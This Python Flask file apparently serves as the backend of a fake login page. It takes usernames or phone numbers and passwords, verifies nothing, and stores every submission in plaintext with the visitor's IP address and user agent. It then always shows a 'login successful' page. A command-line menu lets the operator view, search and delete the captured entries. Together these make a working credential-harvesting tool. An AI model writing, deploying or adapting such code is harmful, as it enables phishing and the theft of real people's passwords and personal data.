from flask import Flask, request, render_template, redirect, url_for
import json
import datetime
import os

app = Flask(__name__)

# File to store user information
DATA_FILE = "data.json"

def load_data():
    """Load user data from the JSON file."""
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as file:
            try:
                return json.load(file)
            except json.JSONDecodeError:
                return {}
    return {}

def save_data(data):
    """Save user data to the JSON file."""
    with open(DATA_FILE, 'w') as file:
        json.dump(data, file, indent=4)

@app.route('/')
def home():
    """Render the login form."""
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submissions."""
    # Capture form data
    login_method = request.form.get('loginMethod')
    username = request.form.get('username', '').strip()
    phone = request.form.get('phone', '').strip()
    password = request.form.get('password', '').strip()

    # Validate and process input
    if login_method == 'username' and username:
        phone = None  # Username method is used; ignore phone
    elif login_method == 'phone' and phone:
        username = None  # Phone method is used; ignore username
    else:
        # Missing required fields for the selected method
        return render_template('login.html', error="Invalid login method or missing credentials")

    # Create user data entry
    user_data = {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent'),
        "login_method": login_method,
        "username": username,
        "phone": phone,
        "password": password
    }

    # Save data to the JSON file
    data = load_data()
    visitor_id = f"visitor_{len(data) + 1}"
    data[visitor_id] = user_data
    save_data(data)

    # Redirect to the success page
    return redirect(url_for('login_successful'))

@app.route('/login-successful')
def login_successful():
    """Render the success page."""
    return render_template('success.html')

def cli_view_data():
    """Display all user data saved in the JSON file."""
    data = load_data()
    if not data:
        print("No data available.")
        return

    print("\n=== User Data ===")
    for visitor_id, user_data in data.items():
        print(f"ID: {visitor_id}")
        for key, value in user_data.items():
            print(f"  {key.capitalize()}: {value}")
        print("-" * 30)

def cli_search_by_id():
    """Search and display a specific user's data by their visitor ID."""
    data = load_data()
    if not data:
        print("No data available.")
        return

    visitor_id = input("Enter Visitor ID (e.g., visitor_1): ").strip()
    if visitor_id in data:
        print(f"\n=== Details for {visitor_id} ===")
        for key, value in data[visitor_id].items():
            print(f"  {key.capitalize()}: {value}")
    else:
        print("Invalid Visitor ID.")

def cli_delete_entry():
    """Delete a specific user's data by their visitor ID."""
    data = load_data()
    if not data:
        print("No data available.")
        return

    visitor_id = input("Enter Visitor ID to delete (e.g., visitor_1): ").strip()
    if visitor_id in data:
        del data[visitor_id]
        save_data(data)
        print(f"Visitor {visitor_id} deleted successfully.")
    else:
        print("Invalid Visitor ID.")

def cli_main_menu():
    """Command-line interface to interact with the app."""
    print("\n=== Flask App CLI ===")
    print("1. View All User Data")
    print("2. Search User Data by Visitor ID")
    print("3. Delete User Data by Visitor ID")
    print("4. Start the Flask Server")
    print("5. Exit")

    while True:
        choice = input("\nEnter your choice: ").strip()
        if choice == "1":
            cli_view_data()
        elif choice == "2":
            cli_search_by_id()
        elif choice == "3":
            cli_delete_entry()
        elif choice == "4":
            print("Starting Flask server...")
            app.run(debug=True)
            break
        elif choice == "5":
            print("Exiting CLI.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == '__main__':
    cli_main_menu()
